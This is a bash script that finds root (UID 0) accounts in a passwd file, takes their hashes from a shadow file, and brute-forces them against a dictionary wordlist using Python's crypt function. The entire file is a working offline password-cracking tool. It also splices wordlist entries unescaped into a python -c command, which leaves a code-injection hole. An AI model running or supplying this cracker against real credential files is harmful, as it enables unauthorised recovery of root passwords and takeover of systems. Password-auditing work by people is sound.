#!/bin/bash

ROOT_UID=0

[[ "$#" -eq 3 ]] || { echo "[*] Usage : `basename $0` <passwd_file> <shadow_file> <dict_file>" && exit;}

for rootname in `sed -ne 's|^\([a-zA-Z0-9.\/@_-][a-zA-Z0-9.\/@_-]*\):[x!]:'$ROOT_UID'.*|\1|p' <"$1"`; do
	echo
	echo "[*] Found root account with username : $rootname "
	echo "[*] Starting brute force .."

 	entry=`sed -ne 's|^'"$rootname"':\($[0-9]$[a-zA-Z0-9./][a-zA-Z0-9./]*$[a-zA-Z0-9./][a-zA-Z0-9./]*\):.*|\1|p' < "$2"`
	
	IFS='$' read -ra fields <<< `echo -n $entry `
	
	while IFS= read -r password || [ -n "$password" ] 
	do
		
		echo -n "[?] Trying password '"$password"' for account '"$rootname"' : "
		result=`python -c 'from crypt import crypt; print crypt( "'$password'"','"$'${fields[1]}'$'${fields[2]}'$")'`
		[[ "$entry" = "$result" ]] && echo " SUCCESS!" && break || echo " FAILURE."
		
	done < "$3"
	echo
done

exit 0





